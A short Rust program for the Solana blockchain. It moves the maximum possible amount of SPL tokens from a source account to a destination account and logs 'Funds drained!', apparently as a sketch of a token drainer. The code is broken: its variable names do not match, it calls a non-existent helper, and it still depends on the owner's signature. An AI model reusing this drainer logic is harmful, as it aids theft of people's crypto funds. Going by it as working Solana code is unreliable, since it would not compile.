use solana_program::{
    account_info::{AccountInfo, next_account_info},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    system_instruction,
    sysvar::rent::Rent,
};

use spl_token::instruction::transfer;

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();

    let source_token_account = next_account_info(account_iter)?;
    let destination_token_account = next_account_info(accounts_iter)?;
    let _authority = next_account_info(accounts_iter)?;
    let _token_program = next_program_info(accounts_iter)?;

    let transfer_instruction = transfer(
        &spl_token::id(),
        source_token_account.key,
        destination_token_account.key,
        _authority.key,  // is this is like only owner
        &[],
        u64::MAX,
    )?;

    invoke(
        &transfer_instruction,
        &[
            source_token_account.clone(),
            destination_token_account.clone(),
            _authority.clone(),
        ],
    )?;

    msg!("Funds drained!");

    Ok(())
}
